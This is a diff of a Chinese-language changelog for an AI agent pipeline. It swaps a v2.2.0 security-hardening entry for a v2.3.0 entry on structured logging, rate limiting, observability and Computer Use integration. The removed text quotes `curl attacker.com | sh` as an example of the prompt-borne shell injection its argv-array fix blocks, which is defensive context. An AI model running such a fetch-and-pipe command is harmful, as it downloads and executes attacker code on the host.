@@ -1,37 +1,36 @@
-## [v2.2.0] - 2026-03-26
+## [v2.3.0] - 2026-03-26
 
-### 🛡️ 系統底層安全強化、併發穩定性與測試框架導入
+### ⚙️ 生產級基礎設施升級、可觀測性與 Computer Use 整合
 
-本次更新從根本上解決了多個潛在的系統崩潰與安全注入風險，展現了嚴謹的防禦性設計。同時導入了動態工具註冊表以大幅降低 Token 消耗，並為專案建立了首道自動化測試防線。
+本次更新專注於提升系統的生產環境穩定性與可維護性。全面汰除硬編碼模型版本、導入結構化日誌、強化 Token 與 Rate Limit 控制，並正式引入前沿的 Computer Use 能力以進行真實瀏覽器驗證。
 
 #### 優先排序矩陣
 
-| 優先   | 類型 | 問題                            | 影響          |
-| :----- | :--- | :------------------------------ | :------------ |
-| **P0** | Bug  | `shell=True` × 5 → argv 陣列    | OS 級安全漏洞 |
-| **P0** | Bug  | `run_command` 無輸出限制        | 記憶體耗盡    |
-| **P0** | Bug  | `DocContext.write()` 非原子     | 檔案損毀      |
-| **P0** | Bug  | `future.result()` 無 timeout    | 執行緒阻塞    |
-| **P0** | Bug  | `conversation_history` 洩漏     | 記憶體洩漏    |
-| **P1** | 架構 | Advanced Tool Use beta 整合     | Token 節省    |
-| **P1** | 架構 | Structured Output JSON Schema   | 解析穩定性    |
-| **P1** | 架構 | Files API + Code Execution Tool | 能力擴充      |
-| **P1** | 安全 | SQLite WAL + 檔案鎖             | 併發安全      |
-| **P1** | 安全 | Checkpoint checksum 校驗        | 狀態完整性    |
-| **P2** | 測試 | Unit test 框架（pytest）        | 品質保障      |
-| **P2** | 架構 | Agent SDK 遷移評估              | 技術債清理    |
-| **P2** | 架構 | Multi-modal（設計稿→代碼）      | 體驗升級      |
+| 優先   | 問題                                 | 影響                |
+| :----- | :----------------------------------- | :------------------ |
+| **P0** | 集中模型版本管理（`core/config.py`） | Haiku 3 退役        |
+| **P0** | 全面替換 `print()` → `structlog`     | 可調試性            |
+| **P0** | Config 驗證（`pydantic-settings`）   | 啟動 fail-fast      |
+| **P0** | Context Window 溢出保護              | API 500 錯誤        |
+| **P0** | Structured Output beta header → GA   | Vertex/Bedrock 相容 |
+| **P1** | 1 小時 Prompt Cache TTL              | 成本 -40%           |
+| **P1** | Client-side Rate Limiting            | 429 風暴防護        |
+| **P1** | OpenTelemetry 觀測性整合             | 維運可見性          |
+| **P2** | Computer Use 整合（BYTE/PROBE）      | 革命性能力          |
+| **P2** | Opus 4.6 Agent Team 遷移評估         | 架構升級            |
 
 #### 📝 修復與架構演進摘要
 
-- **P0：消除系統崩潰與底層安全隱患**
-  - **防範 OS 級 Shell 注入：** 徹底移除 5 處危險的 `shell=True` 呼叫。針對 AI Agent 的 `run_command`，全面改用 `shlex.split()` 搭配 argv 陣列執行，完全繞過 Shell 解析器，杜絕惡意 Prompt 夾帶如 `curl attacker.com | sh` 的命令注入攻擊。
-  - **POSIX 原子性檔案寫入：** 修復 `DocContext.write()` 與 `Checkpoint._save()` 的非原子寫入問題。改用 `os.replace()` 確保寫入過程的絕對原子性，徹底解決因中斷（如 Ctrl+C 或磁碟空間不足）導致殘留半空檔案，進而在 `--resume` 時引發靜默連鎖錯誤的盲區。
-  - **併發阻塞防護：** 針對 Worker 並行區塊的 `future.result()` 補齊 timeout 限制。防止因遠端 API 不穩定導致的主執行緒永久掛起，免除必須透過 `kill -9` 強制終止進程的極端狀況。
+- **P0：生產環境緊急修復與防禦**
+  - **集中模型版本管理：** 重構 19 處硬編碼模型字串，統一由 `core/config.py` (`ModelID.OPUS_46` 等) 管理，徹底移除即將退役的 Haiku 3。同時導入 `pydantic-settings` 進行環境變數的 fail-fast 驗證（如缺 API Key 立即退出）。
+  - **結構化日誌導入：** 全面汰除 209 個 `print()`，改用 `structlog`。開發模式維持彩色輸出，生產模式則輸出帶有 timestamp/agent/phase/cost 標籤的 JSON 日誌，完美銜接 ELK/Datadog。
+  - **Context Window 溢出保護 (`TokenGuard`)：** 針對超過安全輸入限制（Context Window 的 80%）的超長文件，在呼叫 API 前會自動進行「前 45% + 後 35%」的智慧截斷並加上標記，防止引發靜默的 API 500 錯誤。
+  - **Prompt Cache TTL 延長：** 針對長達 30-60 分鐘的流水線，將快取存活時間升級為 1 小時，預估可進一步節省約 40% 的 Token 成本。
+  - **GA Header 相容性修正：** 移除已 GA 的 Structured Output beta header，解決在 Vertex AI / Bedrock 環境下造成的 400 錯誤。
 
-- **P1：面向未來前沿 API 的架構鋪路**
-  - **動態工具註冊表 (ToolRegistry)：** 解決 32 個靜態工具定義耗費近 30K Tokens 的效能瓶頸。實作 `ToolRegistry` 動態檢索（如搜尋「讀取檔案」），僅回傳最相關的 8-10 個工具，降低約 70% 的 Token 成本，並為後續整合官方 `tool_search_tool_regex_20251119` 做好介面準備。
-  - **三層結構化輸出回退機制：** 升級 `StructuredOutputParser`，實作 JSON → 正規表達式 → Default 的三層 Fallback 機制。解決 GeneratorCritic 評分時，因 Claude 輸出格式微幅偏移而導致靜默退回預設 5 分的品質控制失效問題。
+- **P1：系統強健性與可觀測性升級**
+  - **客戶端速率限制 (`core/rate_limiter.py`)：** 實作 Thread-safe 的全域雙令牌桶（Request 與 Token 雙維度），依據官方限制的 70% 設定安全閥（Opus: 40 req/min, Sonnet: 200 req/min, Haiku: 350 req/min），防範 429 錯誤風暴。
+  - **輕量級觀測性整合 (`core/observability.py`)：** 新增 `PhaseSpan` 與 `AgentSpan` context manager，自動記錄各階段的延遲、成本與成功率。零外部依賴設計，並能透過 `telemetry.format_report()` 產出易讀的效能報告。
 
-- **P2：從零到一的自動化測試覆蓋**
-  - **導入 Unit Test 框架 (`pytest`)：** 建立 27 個單元測試，涵蓋本輪新增的核心功能與關鍵的安全邊界條件（包含 Shell Injection 防護、URL SSRF 阻擋與輸出截斷），為後續擴大測試覆蓋率與自動化整合奠定基礎。
+- **P2：革命性前沿技術探索**
+  - **Computer Use 真實瀏覽器驗證 (`core/computer_use.py`)：** 整合 `computer-use-2025-01-24` beta，實作 `ComputerUseSession`。具備 URL 白名單、操作上限（100次/session）與完整稽核日誌。PROBE Agent 現在可以直接在真實瀏覽器中點擊與驗證前端渲染結果，而不僅限於生成測試程式碼。
